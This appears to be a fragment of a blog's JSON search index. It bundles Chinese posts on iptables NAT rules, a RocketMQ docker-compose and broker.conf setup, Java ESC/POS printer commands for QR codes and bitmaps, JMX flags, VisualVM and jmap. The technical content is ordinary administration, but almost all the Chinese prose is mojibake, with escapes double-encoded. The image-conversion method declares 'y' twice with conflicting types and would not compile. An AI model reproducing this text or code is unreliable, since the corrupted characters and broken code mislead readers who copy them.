è¿™ä¸ªé…ç½®é¡¹é…ç½®äº†ä»1çº§å¼€å§‹å„çº§å»¶æ—¶çš„æ—¶é—´ï¼Œå¦‚1è¡¨ç¤ºå»¶æ—¶1sï¼Œ2è¡¨ç¤ºå»¶æ—¶5sï¼Œ14è¡¨ç¤ºå»¶æ—¶10mï¼Œå¯ä»¥ä¿®æ”¹è¿™ä¸ªæŒ‡å®šçº§åˆ«çš„å»¶æ—¶æ—¶é—´ï¼› "},{"id":52,"href":"/posts/history/%E6%9F%A5%E7%9C%8B%E7%BD%91%E7%BB%9C%E5%91%BD%E4%BB%A4%E8%AE%B0%E5%BD%95/","title":"æŸ¥çœ‹ç½‘ç»œå‘½ä»¤è®°å½•","section":"æˆ‘çš„åšå®¢","content":"åˆ—å‡ºå½“å‰çš„é˜²ç«å¢™è§„åˆ™ï¼ŒæŸ¥çœ‹ç½‘ç»œé“¾è·¯\niptables -t nat -L -n --line-numbers Chain PREROUTING (policy ACCEPT) num target prot opt source destination 1 DOCKER all -- 0.0.0.0/0 0.0.0.0/0 ADDRTYPE match dst-type LOCAL Chain INPUT (policy ACCEPT) num target prot opt source destination Chain OUTPUT (policy ACCEPT) num target prot opt source destination 1 DOCKER all -- 0.0.0.0/0 !127.0.0.0/8 ADDRTYPE match dst-type LOCAL Chain POSTROUTING (policy ACCEPT) num target prot opt source destination 1 MASQUERADE all -- 172.17.0.0/16 0.0.0.0/0 2 MASQUERADE all -- 172.23.0.0/16 0.0.0.0/0 3 MASQUERADE tcp -- 172.23.0.2 172.23.0.2 tcp dpt:443 4 MASQUERADE tcp -- 172.23.0.2 172.23.0.2 tcp dpt:80 5 MASQUERADE tcp -- 172.23.0.3 172.23.0.3 tcp dpt:8090 Chain DOCKER (2 references) num target prot opt source destination 1 RETURN all -- 0.0.0.0/0 0.0.0.0/0 2 RETURN all -- 0.0.0.0/0 0.0.0.0/0 3 DNAT tcp -- 0.0.0.0/0 0.0.0.0/0 tcp dpt:443 to:172.23.0.2:443 4 DNAT tcp -- 0.0.0.0/0 0.0.0.0/0 tcp dpt:80 to:172.23.0.2:80 5 DNAT tcp -- 0.0.0.0/0 0.0.0.0/0 tcp dpt:8090 to:172.23.0.3:8090 åˆ é™¤è§„åˆ™\niptables -t nat -D POSTROUTING 4 4æ˜¯numï¼Œç¬¬å‡ æ¡è§„åˆ™ æŸ¥çœ‹ç«¯å£\nlsof -i:ç«¯å£å· --------------- netstat -tunlp | grep ç«¯å£å· -t (tcp) ä»…æ˜¾ç¤ºtcpç›¸å…³é€‰é¡¹ -u (udp)ä»…æ˜¾ç¤ºudpç›¸å…³é€‰é¡¹ -n æ‹’ç»æ˜¾ç¤ºåˆ«åï¼Œèƒ½æ˜¾ç¤ºæ•°å­—çš„å…¨éƒ¨è½¬åŒ–ä¸ºæ•°å­— -l ä»…åˆ—å‡ºåœ¨Listen(ç›‘å¬)çš„æœåŠ¡çŠ¶æ€ -p æ˜¾ç¤ºå»ºç«‹ç›¸å…³é“¾æ¥çš„ç¨‹åºå "},{"id":53,"href":"/posts/history/docker-compose%E6%90%AD%E5%BB%BArocketmq/","title":"Docker Composeæ­å»º Rocket Mq","section":"æˆ‘çš„åšå®¢","content":"RocketMQæ¶æ„å›¾ æ­å»ºRocketMQæœåŠ¡éœ€è¦NameServerã€Brokerå’ŒRocketMQçš„ç®¡ç†åå°ã€‚\n1ã€docker-composeæ–‡ä»¶\nversion: \u0026#39;2\u0026#39; services: rmqnamesrv: image: apacherocketmq/rocketmq:latest container_name: rmqnamesrv ports: - 9876:9876 volumes: - ./file/rmqnamesrv/logs:/home/rocketmq/logs command: sh mqnamesrv rmqbroker: image: apacherocketmq/rocketmq:latest container_name: rmqbroker ports: - 10909:10909 - 10911:10911 - 10912:10912 volumes: # è¿™é‡Œè¦æ³¨æ„ä¸€ä¸‹ï¼Œlogså’Œstoreæ–‡ä»¶è¦ç»™å¤Ÿæƒé™ - ./file/rmqbroker/logs:/home/rocketmq/logs - ./file/rmqbroker/store:/home/rocketmq/store - ./env/broker.conf:/home/rocketmq/conf/broker.conf environment: JAVA_OPTS: \u0026#34; -Duser.home=/opt\u0026#34; JAVA_OPT_EXT: \u0026#34;-server -Xms128m -Xmx128m -Xmn128m\u0026#34; command: sh mqbroker -n rmqnamesrv:9876 -c /home/rocketmq/conf/broker.conf depends_on: - rmqnamesrv rmqconsole: image: styletang/rocketmq-console-ng:latest container_name: rmqconsole ports: - 8081:8080 environment: JAVA_OPTS: \u0026#34;-Drocketmq.namesrv.addr=rmqnamesrv:9876 -Dcom.rocketmq.sendMessageWithVIPChannel=false\u0026#34; depends_on: - rmqnamesrv broker.conf\n# æ‰€å±é›†ç¾¤åå­— brokerClusterName=DefaultCluster # broker åå­—ï¼Œæ³¨æ„æ­¤å¤„ä¸åŒçš„é…ç½®æ–‡ä»¶å¡«å†™çš„ä¸ä¸€æ ·ï¼Œå¦‚æœåœ¨ broker-a.properties ä½¿ç”¨: broker-a, # åœ¨ broker-b.properties ä½¿ç”¨: broker-b brokerName=broker-a # 0 è¡¨ç¤º Masterï¼Œ\u0026amp;gt; 0 è¡¨ç¤º Slave brokerId=0 # nameServeråœ°å€ï¼Œåˆ†å·åˆ†å‰² # namesrvAddr=rocketmq-nameserver1:9876;rocketmq-nameserver2:9876 # å¯åŠ¨IP,å¦‚æœ docker æŠ¥ com.alibaba.rocketmq.remoting.exception.RemotingConnectException: connect to \u0026amp;lt;192.168.0.120:10909\u0026amp;gt; failed # è§£å†³æ–¹å¼1 åŠ ä¸Šä¸€å¥ producer.setVipChannelEnabled(false);ï¼Œè§£å†³æ–¹å¼2 brokerIP1 è®¾ç½®å®¿ä¸»æœºIPï¼Œä¸è¦ä½¿ç”¨docker å†…éƒ¨IP brokerIP1=192.168.1.16 # åœ¨å‘é€æ¶ˆæ¯æ—¶ï¼Œè‡ªåŠ¨åˆ›å»ºæœåŠ¡å™¨ä¸å­˜åœ¨çš„topicï¼Œé»˜è®¤åˆ›å»ºçš„é˜Ÿåˆ—æ•° defaultTopicQueueNums=4 # æ˜¯å¦å…è®¸ Broker è‡ªåŠ¨åˆ›å»º Topicï¼Œå»ºè®®çº¿ä¸‹å¼€å¯ï¼Œçº¿ä¸Šå…³é—­ ï¼ï¼ï¼è¿™é‡Œä»”ç»†çœ‹æ˜¯ falseï¼Œfalseï¼Œfalse autoCreateTopicEnable=true # æ˜¯å¦å…è®¸ Broker è‡ªåŠ¨åˆ›å»ºè®¢é˜…ç»„ï¼Œå»ºè®®çº¿ä¸‹å¼€å¯ï¼Œçº¿ä¸Šå…³é—­ autoCreateSubscriptionGroup=true # Broker å¯¹å¤–æœåŠ¡çš„ç›‘å¬ç«¯å£ listenPort=10911 # åˆ é™¤æ–‡ä»¶æ—¶é—´ç‚¹ï¼Œé»˜è®¤å‡Œæ™¨4ç‚¹ deleteWhen=04 # æ–‡ä»¶ä¿ç•™æ—¶é—´ï¼Œé»˜è®¤48å°æ—¶ fileReservedTime=120 # commitLog æ¯ä¸ªæ–‡ä»¶çš„å¤§å°é»˜è®¤1G mapedFileSizeCommitLog=1073741824 # ConsumeQueue æ¯ä¸ªæ–‡ä»¶é»˜è®¤å­˜ 30W æ¡ï¼Œæ ¹æ®ä¸šåŠ¡æƒ…å†µè°ƒæ•´ mapedFileSizeConsumeQueue=300000 # destroyMapedFileIntervalForcibly=120000 # redeleteHangedFileInterval=120000 # æ£€æµ‹ç‰©ç†æ–‡ä»¶ç£ç›˜ç©ºé—´ diskMaxUsedSpaceRatio=88 # å­˜å‚¨è·¯å¾„ # storePathRootDir=/home/ztztdata/rocketmq-all-4.1.0-incubating/store # commitLog å­˜å‚¨è·¯å¾„ # storePathCommitLog=/home/ztztdata/rocketmq-all-4.1.0-incubating/store/commitlog # æ¶ˆè´¹é˜Ÿåˆ—å­˜å‚¨ # storePathConsumeQueue=/home/ztztdata/rocketmq-all-4.1.0-incubating/store/consumequeue # æ¶ˆæ¯ç´¢å¼•å­˜å‚¨è·¯å¾„ # storePathIndex=/home/ztztdata/rocketmq-all-4.1.0-incubating/store/index # checkpoint æ–‡ä»¶å­˜å‚¨è·¯å¾„ # storeCheckpoint=/home/ztztdata/rocketmq-all-4.1.0-incubating/store/checkpoint # abort æ–‡ä»¶å­˜å‚¨è·¯å¾„ # abortFile=/home/ztztdata/rocketmq-all-4.1.0-incubating/store/abort # é™åˆ¶çš„æ¶ˆæ¯å¤§å° maxMessageSize=65536 # flushCommitLogLeastPages=4 # flushConsumeQueueLeastPages=2 # flushCommitLogThoroughInterval=10000 # flushConsumeQueueThoroughInterval=60000 # Broker çš„è§’è‰² # - ASYNC_MASTER å¼‚æ­¥å¤åˆ¶Master # - SYNC_MASTER åŒæ­¥åŒå†™Master # - SLAVE brokerRole=ASYNC_MASTER # åˆ·ç›˜æ–¹å¼ # - ASYNC_FLUSH å¼‚æ­¥åˆ·ç›˜ # - SYNC_FLUSH åŒæ­¥åˆ·ç›˜ flushDiskType=ASYNC_FLUSH # å‘æ¶ˆæ¯çº¿ç¨‹æ± æ•°é‡ # sendMessageThreadPoolNums=128 # æ‹‰æ¶ˆæ¯çº¿ç¨‹æ± æ•°é‡ # pullMessageThreadPoolNums=128 "},{"id":54,"href":"/posts/history/rocketmq%E7%9A%84%E4%BB%8B%E7%BB%8D/","title":"Rocket Mqçš„ä»‹ç»","section":"æˆ‘çš„åšå®¢","content":"RocketMQ æ¶æ„å›¾ æœ‰å››å¤§éƒ¨åˆ†ï¼šNameServerï¼ŒBrokerï¼ŒProducerï¼ŒConsumerã€‚\nNameServer\r#\rNameServerä¸»è¦åŒ…æ‹¬ä¸¤ä¸ªä¸»è¦åŠŸèƒ½ï¼š\n1ã€ç®¡ç†brokersï¼šbrokeræœåŠ¡å™¨å¯åŠ¨æ—¶ä¼šæ³¨å†Œåˆ°NameServerä¸Šï¼Œå¹¶ä¸”ä¸¤è€…ä¹‹é—´ä¿æŒå¿ƒè·³ç›‘æµ‹æœºåˆ¶ï¼Œä»¥æ­¤æ¥ä¿è¯NameServerçŸ¥é“brokerçš„å­˜æ´»çŠ¶æ€ï¼›\n2ã€è·¯ç”±ä¿¡æ¯ç®¡ç†ï¼šæ¯ä¸€å°NameServeréƒ½å­˜æœ‰å…¨éƒ¨çš„brokeré›†ç¾¤ä¿¡æ¯å’Œç”Ÿäº§è€…/æ¶ˆè´¹è€…å®¢æˆ·ç«¯çš„è¯·æ±‚ä¿¡æ¯ï¼›\nBroker\r#\rBrokerçš„å››å¤§ä½œç”¨ï¼š\n1ã€è¯·æ±‚åˆ†å‘ï¼šæ˜¯clientçš„å…¥å£ï¼Œæ¥æ”¶æ¥è‡ªç”Ÿäº§è€…æ¶ˆè´¹è€…çš„è¯·æ±‚ 2ã€clientç®¡ç†ï¼šç®¡ç†å®¢æˆ·ï¼ˆäº§å“/æ¶ˆè´¹è€…ï¼‰å¹¶ç»´æŠ¤æ¶ˆè´¹è€…çš„ä¸»é¢˜è®¢é˜…ã€‚ 3ã€æ•°æ®å­˜å‚¨ï¼šæä¾›ç®€å•çš„apiæ¥æŸ¥è¯¢ç£ç›˜ä¸Šçš„ä¸´æ—¶æ•°æ® 4ã€é«˜å¯ç”¨ï¼šä¸»ä»èŠ‚ç‚¹é—´åŒæ­¥æ•°æ®ä¿è¯é«˜å¯ç”¨\nProducer\r#\rProducerå¯åŠ¨æ—¶ï¼Œéœ€è¦æŒ‡å®šNameServerçš„åœ°å€ï¼Œä»NameServeré›†ç¾¤ä¸­é€‰ä¸€å°å»ºç«‹é•¿è¿æ¥ã€‚å¦‚æœè¯¥NameServerå®•æœºï¼Œä¼šè‡ªåŠ¨è¿å…¶ä»–NameServerã€‚ç›´åˆ°æœ‰å¯ç”¨çš„NameServerä¸ºæ­¢ã€‚ç”Ÿäº§è€…æ¯30ç§’ä»NameServerè·å–Topicè·ŸBrokerçš„æ˜ å°„å…³ç³»ï¼Œæ›´æ–°åˆ°æœ¬åœ°å†…å­˜ä¸­ã€‚å†è·ŸTopicæ¶‰åŠçš„æ‰€æœ‰Brokerå»ºç«‹é•¿è¿æ¥ï¼Œæ¯éš”30ç§’å‘ä¸€æ¬¡å¿ƒè·³ã€‚Brokeræ¯éš”10sä¸­æ‰«ææ‰€æœ‰å­˜æ´»çš„è¿æ¥ï¼Œå¦‚æœBrokeråœ¨2åˆ†é’Ÿå†…æ²¡æœ‰æ”¶åˆ°å¿ƒè·³æ•°æ®ï¼Œåˆ™å…³é—­ä¸Producerçš„è¿æ¥ã€‚\nConsumer\r#\ræ¶ˆè´¹å®¢æˆ·ç«¯çš„è¿æ¥æ–¹å¼å’Œç”Ÿäº§è€…ç±»ä¼¼ã€‚\nå…¶ä»–æ¦‚å¿µ\r#\r1ã€ Topic ä¸€ä¸ªåº”ç”¨å°½å¯èƒ½ç”¨ä¸€ä¸ªTopicï¼Œæ¶ˆæ¯å­ç±»å‹ç”¨tagsæ¥æ ‡è¯†ï¼Œtagså¯ä»¥ç”±åº”ç”¨è‡ªç”±è®¾ç½®ã€‚åªæœ‰å‘é€æ¶ˆæ¯è®¾ç½®äº†tagsï¼Œæ¶ˆè´¹æ–¹åœ¨è®¢é˜…æ¶ˆæ¯æ—¶ï¼Œæ‰å¯ä»¥åˆ©ç”¨tags åœ¨brokeråšæ¶ˆæ¯è¿‡æ»¤ã€‚\n2ã€ key æ¯ä¸ªæ¶ˆæ¯åœ¨ä¸šåŠ¡å±‚é¢çš„å”¯ä¸€æ ‡è¯†ç ï¼Œè¦è®¾ç½®åˆ° keys å­—æ®µï¼Œæ–¹ä¾¿å°†æ¥å®šä½æ¶ˆæ¯ä¸¢å¤±é—®é¢˜ã€‚æœåŠ¡å™¨ä¼šä¸ºæ¯ä¸ªæ¶ˆæ¯åˆ›å»ºç´¢å¼•(å“ˆå¸Œç´¢å¼•)ï¼Œåº”ç”¨å¯ä»¥é€šè¿‡ topicï¼Œkeyæ¥æŸ¥è¯¢è¿™æ¡æ¶ˆæ¯å†…å®¹ï¼Œä»¥åŠæ¶ˆæ¯è¢«è°æ¶ˆè´¹ã€‚ç”±äºæ˜¯å“ˆå¸Œç´¢å¼•ï¼Œè¯·åŠ¡å¿…ä¿è¯key å°½å¯èƒ½å”¯ä¸€ï¼Œè¿™æ ·å¯ä»¥é¿å…æ½œåœ¨çš„å“ˆå¸Œå†²çªã€‚\n3ã€Messageï¼šæ¶ˆæ¯ï¼Œè¦ä¼ è¾“çš„ä¿¡æ¯ã€‚\n4ã€Message Queueï¼šæ¶ˆæ¯é˜Ÿåˆ—\n5ã€send sendæ¶ˆæ¯æ–¹æ³•ï¼Œåªè¦ä¸æŠ›å¼‚å¸¸ï¼Œå°±ä»£è¡¨å‘é€æˆåŠŸã€‚ä½†æ˜¯å‘é€æˆåŠŸä¼šæœ‰å¤šä¸ªçŠ¶æ€ï¼Œåœ¨sendResulté‡Œå®šä¹‰ã€‚\nSEND_OKï¼šæ¶ˆæ¯å‘é€æˆåŠŸ\nFLUSH_DISK_TIMEOUTï¼šæ¶ˆæ¯å‘é€æˆåŠŸï¼Œä½†æ˜¯æœåŠ¡å™¨åˆ·ç›˜è¶…æ—¶ï¼Œæ¶ˆæ¯å·²ç»è¿›å…¥æœåŠ¡å™¨é˜Ÿåˆ—ï¼Œåªæœ‰æ­¤æ—¶æœåŠ¡å™¨å®•æœºï¼Œæ¶ˆæ¯æ‰ä¼šä¸¢å¤±\nFLUSH_SLAVE_TIMEOUTï¼šæ¶ˆæ¯å‘é€æˆåŠŸï¼Œä½†æ˜¯æœåŠ¡å™¨åŒæ­¥åˆ°Slaveæ—¶è¶…æ—¶ï¼Œæ¶ˆæ¯å·²ç»è¿›å…¥æœåŠ¡å™¨é˜Ÿåˆ—ï¼Œåªæœ‰æ­¤æ—¶æœåŠ¡å™¨å®•æœºï¼Œæ¶ˆæ¯æ‰ä¼šä¸¢å¤±\nSLAVE_NOT_AVAILABLEï¼šæ¶ˆæ¯å‘é€æˆåŠŸï¼Œä½†æ˜¯æ­¤æ—¶slaveä¸å¯ç”¨ï¼Œæ¶ˆæ¯å·²ç»è¿›å…¥æœåŠ¡å™¨é˜Ÿåˆ—ï¼Œåªæœ‰æ­¤æ—¶æœåŠ¡å™¨å®•æœºï¼Œæ¶ˆæ¯æ‰ä¼šä¸¢å¤±\n"},{"id":55,"href":"/posts/history/%E4%BD%BF%E7%94%A8%E9%A1%B5%E6%A8%A1%E5%BC%8F%E6%89%93%E5%8D%B0%E5%A4%9A%E4%B8%AA%E4%BA%8C%E7%BB%B4%E7%A0%81/","title":"ä½¿ç”¨é¡µæ¨¡å¼æ‰“å°å¤šä¸ªäºŒç»´ç ","section":"æˆ‘çš„åšå®¢","content":"\rä½¿ç”¨é¡µæ¨¡å¼æ‰“å°å¤šä¸ªäºŒç»´ç \r#\rå¯èƒ½ä¼šåœ¨ä½¿ç”¨é¡µæ¨¡å¼å‰å‡ºç°åœé¡¿ï¼Œé¡µæ¨¡å¼è¦å…ˆæŠŠæŒ‡ä»¤ç¼–å¥½ï¼Œå†æ‰“å°ã€‚\næ­¥éª¤ï¼š\n1ã€å¼€å§‹é¡µæ¨¡å¼\n2ã€é¡µæ¨¡å¼åç§»é‡\n3ã€è®¾ç½®äºŒç»´ç å¤§å°\n4ã€è®¾ç½®äºŒç»´ç é”™è¯¯çº é”™ç­‰çº§\n5ã€ä¼ è¾“æ•°æ®è‡³ç¼–ç ç¼“å­˜ï¼ˆæ‰“å°äºŒç»´ç æ•°æ®ï¼‰\n6ã€æ‰“å°ç¼–ç ç¼“å­˜ä¸­çš„äºŒç»´æ¡ç \næ‰“å°å¤šä¸ªï¼šç»§ç»­ 2-6 æ­¥éª¤\n7ã€æ‰“å°é¡µæ¨¡å¼æ•°æ®ï¼Œå…³é—­é¡µæ¨¡å¼\nå¼€å§‹é¡µæ¨¡å¼\r#\r/** * 0x00,0x00,0x00,0x00 æ˜¯æ‰“å°åŒºåŸŸå·¦ä¸Šè§’ * w,h å®šä¹‰çš„æ˜¯æ‰“å°åŒºåŸŸçš„å³ä¸‹è§’ * w æ˜¯é¡µæ¨¡å¼å†…å®¹åŒºåŸŸçš„å®½ï¼Œå•ä½dot 1mm=8dot * h æ˜¯é¡µæ¨¡å¼å†…å®¹åŒºåŸŸçš„é«˜ï¼Œå•ä½dot */ public byte[] crtiPageStartn(int w,int h) { int w_pL = w%256; int w_pH = w/256; int h_pL = h%256; int h_pH = h/256; byte[] bytes = new byte[]{0x1B,0x4C,0x1B,0x57,0x00,0x00,0x00,0x00,(byte) w_pL,(byte) w_pH,(byte)h_pL,(byte)h_pH}; return bytes; } æ¨ªå‘æ‰“å°äºŒç»´ç \r#\ræ‰“å°äºŒç»´ç è¦å®šä¹‰æ¯ä¸€ä¸ªäºŒç»´ç å·¦ä¸Šè§’çš„ä½ç½®ï¼Œå³åç§»é‡ã€‚\n/** é¡µæ¨¡å¼åç§»é‡ï¼Œå•ä½dot */ public byte[] crtiPrintAnddot(int x) { int x_s = x % 256; int y_s = x / 256; //1B 24 3c 00 --1B 24 nL nH è®¾ç½®ç»å¯¹æ‰“å°ä½ç½®LabelNowX //1D 24 00 00 --1D 24 nL nH é¡µæ¨¡å¼ä¸‹è®¾ç½®çºµå‘ç»å¯¹ä½ç½®LabelNowY byte[] bytes = new byte[]{0x1B, 0x24, (byte)x_s, (byte)y_s, 0x1D, 0x24, 0x00, 0x00}; return bytes; } /** äºŒç»´ç å¤§å° 1-9 */ public byte[] setQrcodeSize(int size) { byte[] bytes = new byte[]{29, 40, 107, 3, 0, 49, 67, (byte) size}; return bytes; } /** * è®¾ç½®äºŒç»´ç é”™è¯¯çº é”™ç­‰çº§ * @param 48 \u0026lt;= n \u0026lt;= 51ï¼Œçº æ­£æ¯”ä¾‹ï¼ˆ7ï¼Œ15ï¼Œ25ï¼Œ30ï¼‰% */ public byte[] setQrcodeErrorCorrectionLevel(byte n) { byte[] bytes = {29, 40, 107, 3, 0, 49, 69, n}; return bytes; } /** * ä¼ è¾“æ•°æ®è‡³ç¼–ç ç¼“å­˜ */ public byte[] setQrcodeData(String text) { byte[] bytes = {29, 40, 107, (byte) ((text.getBytes().length + 3) % 256), (byte) ((text.getBytes().length + 3) / 256), 49, 80, 48}; bytes = byteMerger(bytes, text.getBytes(\u0026#34;GB18030\u0026#34;)); return bytes; } /** * æ‰“å°ç¼–ç ç¼“å­˜ä¸­çš„äºŒç»´æ¡ç  */ public byte[] setPrintQrcode() { byte[] bytes = {29, 40, 107, 3, 0, 49, 81, 48}; return bytes; } /** * åˆå¹¶å­—èŠ‚æ•°ç»„ */ public byte[] byteMerger(byte[] byte_1, byte[] byte_2) { byte[] byte_3 = new byte[byte_1.length + byte_2.length]; System.arraycopy(byte_1, 0, byte_3, 0, byte_1.length); System.arraycopy(byte_2, 0, byte_3, byte_1.length, byte_2.length); return byte_3; } å…³é—­é¡µæ¨¡å¼\r#\r/** ç»“æŸé¡µæ¨¡å¼ */ public byte[] crtiPageEnd() { byte[] bytes = new byte[]{10, 12, 24, 13}; return bytes; } "},{"id":56,"href":"/posts/history/esc%E5%9B%BE%E7%89%87%E9%A2%84%E5%A4%84%E7%90%86%E5%85%88%E5%8A%A0%E8%BD%BD%E8%BF%9B%E6%89%93%E5%8D%B0%E6%9C%BA%E5%86%8D%E7%9B%B4%E6%8E%A5%E8%B0%83%E7%94%A8%E6%89%93%E5%8D%B0/","title":"Escå›¾ç‰‡é¢„å¤„ç†ï¼ˆå…ˆåŠ è½½è¿›æ‰“å°æœºï¼Œå†ç›´æ¥è°ƒç”¨æ‰“å°ï¼‰","section":"æˆ‘çš„åšå®¢","content":"\rESCå›¾ç‰‡é¢„å¤„ç†\r#\rå®šä¹‰\r#\r/** * å®šä¹‰ä½å›¾ */ public byte[] critDefineNV(ArrayList\u0026lt;BufferedImage\u0026gt; images) { int n = images.size(); // å®šä¹‰å‡ ä¸ªä½å›¾ï¼Œæ‰§è¡Œä¼šè¦†ç›–åŸæ¥çš„ byte[] header = new byte[]{28, 113, (byte)n}; for(int i = 0; i \u0026lt; images.size(); ++i) { header = byteMerger(header, imageToByte((BufferedImage)images.get(i))); } return header; } /** * åˆå¹¶å­—èŠ‚æ•°ç»„ */ public byte[] byteMerger(byte[] byte_1, byte[] byte_2) { byte[] byte_3 = new byte[byte_1.length + byte_2.length]; System.arraycopy(byte_1, 0, byte_3, 0, byte_1.length); System.arraycopy(byte_2, 0, byte_3, byte_1.length, byte_2.length); return byte_3; } /** * å›¾ç‰‡è½¬å­—èŠ‚ */ public static byte[] imageToByte(BufferedImage bi) { int[] rgb = new int[3]; int width = bi.getWidth(); int height = bi.getHeight(); StringBuilder res = new StringBuilder(); int i; String y; for(int x = 0; x \u0026lt; width / 8 * 8; ++x) { for(int y = 0; y \u0026lt; height / 8 * 8; ++y) { i = bi.getRGB(x, y); rgb[0] = (i \u0026amp; 16711680) \u0026gt;\u0026gt; 16; rgb[1] = (i \u0026amp; \u0026#39;\\uff00\u0026#39;) \u0026gt;\u0026gt; 8; rgb[2] = i \u0026amp; 255; y = (rgb[0] + rgb[1] + rgb[2]) / 3 \u0026gt;= 200 ? \u0026#34;0\u0026#34; : \u0026#34;1\u0026#34;; res.append(y); } } String x = res.toString(); byte[] i1 = new byte[x.length() / 8]; for(i = 0; i \u0026lt; x.length(); i += 8) { y = x.substring(i, i + 4); String z = x.substring(i + 4, i + 8); byte y1 = Byte.parseByte(y, 2); byte z1 = Byte.parseByte(z, 2); i1[i / 8] = (byte)((byte)(y1 \u0026lt;\u0026lt; 4) | z1); } byte[] bytes = new byte[]{(byte)(width / 8 % 256), (byte)(width / 8 / 256), (byte)(height / 8 % 256), (byte)(height / 8 / 256)}; bytes = byteMerger(bytes, i1); return bytes; } å‘é€æ‰“å°\r#\r/** * 1 â‰¤ n â‰¤ 64 m=0,1,2,3,48,49,50,51 * n æ˜¯ç¬¬å‡ ä¸ªä½å›¾ * m = 0,48 æ­£å¸¸æ‰“å°ï¼› m = 1,49 å€å®½æ‰“å°ï¼› * m = 2,50 å€é«˜æ‰“å°ï¼› m = 3,51 å››å€è§’æ‰“å°ã€‚ */ public byte[] critPrintNV(int n, int mode) { return new byte[]{28, 112, (byte)n, (byte)mode}; } å¯¹é½ï¼ŒåŠ åœ¨æ‰“å°çš„å‰é¢\n16è¿›åˆ¶ï¼š 1B 61 n n=0ï¼Œ48ï¼šå·¦å¯¹é½ï¼› n=1ï¼Œ49ï¼šä¸­é—´å¯¹é½ï¼› n=2ï¼Œ50ï¼›å³å¯¹é½ã€‚ "},{"id":57,"href":"/posts/history/jconsole%E4%BD%BF%E7%94%A8/","title":"Jconsoleä½¿ç”¨","section":"æˆ‘çš„åšå®¢","content":"å¼€å¯JMXç®¡ç†åŠŸèƒ½\nåœ¨JVMå¯åŠ¨å‚æ•°ä¸­æ·»åŠ å¦‚ä¸‹å‚æ•°\n-Djava.rmi.server.hostname=xxx.xxx.xxx.xxx -Dcom.sun.management.jmxremote.port=9999 -Dcom.sun.management.jmxremote.ssl=false -Dcom.sun.management.jmxremote.authenticate=true -Dcom.sun.management.jmxremote.pwd.file=jmxremote.password -Dcom.sun.management.jmxremote.access.file=jmxremote.access "},{"id":58,"href":"/posts/history/visualvm%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/","title":"Visual Vmå·¥å…·ä½¿ç”¨","section":"æˆ‘çš„åšå®¢","content":"\rä½œç”¨\r#\rjvisualVMæ˜¯JDKè‡ªå¸¦çš„Javaæ€§èƒ½åˆ†æå·¥å…·ï¼Œåœ¨JDKçš„binç›®å½•ä¸‹ï¼Œæ–‡ä»¶åå°±å«jvisualVM.exeã€‚\njvisualvmå¯ä»¥ç›‘æ§æœ¬åœ°ã€è¿œç¨‹çš„javaè¿›ç¨‹ï¼Œå®æ—¶æŸ¥çœ‹è¿›ç¨‹çš„cpuã€å †ã€çº¿ç¨‹ç­‰å‚æ•°ï¼Œå¯¹javaè¿›ç¨‹ç”Ÿæˆdumpæ–‡ä»¶ï¼Œå¹¶å¯¹dumpæ–‡ä»¶è¿›è¡Œåˆ†æã€‚\næ’ä»¶å®‰è£…\r#\ræ’ä»¶å®‰è£…ï¼šhttps://visualvm.github.io/pluginscenters.html\nä¸‹è½½ ä¸‹è½½è¦å®‰è£…çš„æ’ä»¶ æ‰“å¼€visualVMå·¥å…·ï¼Œåœ¨å·¥å…·-\u0026gt;æ’ä»¶-\u0026gt;å·²ä¸‹è½½ï¼Œé€‰æ‹©ä¸‹è½½å¥½çš„æ’ä»¶å®‰è£…ã€‚\nå¯¼å…¥jmapå¯¼å‡ºçš„dump\r#\ré€šè¿‡ jmap -dump:live,format=b,file=d:/b.bin 7576 å¯¼å‡ºçš„dumpæ–‡ä»¶ï¼Œå¯ä»¥è£…è½½åˆ°jVisualVMä¸­è¿›è¡Œåˆ†æã€‚\nç‚¹å‡»æ–‡ä»¶-\u0026gt;è½½å…¥ï¼Œé€‰æ‹©æˆ‘ä»¬å¯¼å‡ºå¥½çš„dumpæ–‡ä»¶å³å¯ã€‚\n"},{"id":59,"href":"/posts/history/jmap%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/","title":"Jmapå·¥å…·ä½¿ç”¨","section":"æˆ‘çš„åšå®¢","content":"\rä½œç”¨ï¼š\r#\rjmapæ˜¯JDKä¸­æä¾›çš„ä¸€ä¸ªç”¨æ¥ç›‘è§†è¿›ç¨‹è¿è¡Œä¸­çš„jvmç‰©ç†å†…å­˜çš„å ç”¨æƒ…å†µçš„å·¥å…·ã€‚è¯¥è¿›ç¨‹å†…å­˜å†…ï¼Œæ‰€æœ‰å¯¹è±¡çš„æƒ…å†µï¼Œä¾‹å¦‚äº§ç”Ÿäº†å“ªäº›å¯¹è±¡ï¼Œå¯¹è±¡æ•°é‡ã€‚å½“ç³»ç»Ÿå´©æºƒæ—¶ï¼Œjmap å¯ä»¥ä»coreæ–‡ä»¶æˆ–è¿›ç¨‹ä¸­è·å¾—å†…å­˜çš„å…·ä½“åŒ¹é…æƒ…å†µï¼ŒåŒ…æ‹¬Heap size, Perm sizeç­‰ã€‚\nå½±å“ï¼š\r#\rä½¿ç”¨jmapä¼šå½±å“çº¿ä¸Šè¿è¡Œçš„åº”ç”¨ï¼Œæ‰€ä»¥å°½é‡ä¸è¦åœ¨çº¿ä¸Šæ‰§è¡Œæ­¤å‘½ä»¤ã€‚å¦‚æœæƒ³dumpå †ä¿¡æ¯ï¼Œå¯ä»¥ä½¿ç”¨gcoreå‘½ä»¤ï¼Œæ¯”jmap -dumpå¿«ã€‚\nJmapçš„ä½¿ç”¨\r#\r1ã€æŸ¥çœ‹å †ä¿¡æ¯\njmap -heap \u0026lt;PID\u0026gt;\nå¯ä»¥é€šè¿‡jpså‘½ä»¤æ¥æŸ¥çœ‹æ­£åœ¨è¿è¡Œçš„javaåº”ç”¨è¿›ç¨‹ã€‚\n$ jps 7576 jar 9962 Jps ç„¶åæŸ¥çœ‹å¯¹åº”å †ä¿¡æ¯\n$ jmap -heap 7576 Attaching to process ID 7576, please wait... Debugger attached successfully. Server compiler detected. JVM version is 25.212-b10 using thread-local object allocation. Parallel GC with 4 thread(s) Heap Configuration: MinHeapFreeRatio = 0 MaxHeapFreeRatio = 100 MaxHeapSize = 2116026368 (2018.0MB) NewSize = 44564480 (42.5MB) MaxNewSize = 705167360 (672.5MB) OldSize = 89653248 (85.5MB) NewRatio = 2 SurvivorRatio = 8 MetaspaceSize = 21807104 (20.796875MB) CompressedClassSpaceSize = 1073741824 (1024.0MB) MaxMetaspaceSize = 17592186044415 MB G1HeapRegionSize = 0 (0.0MB) Heap Usage: PS Young Generation Eden Space: capacity = 116391936 (111.0MB) used = 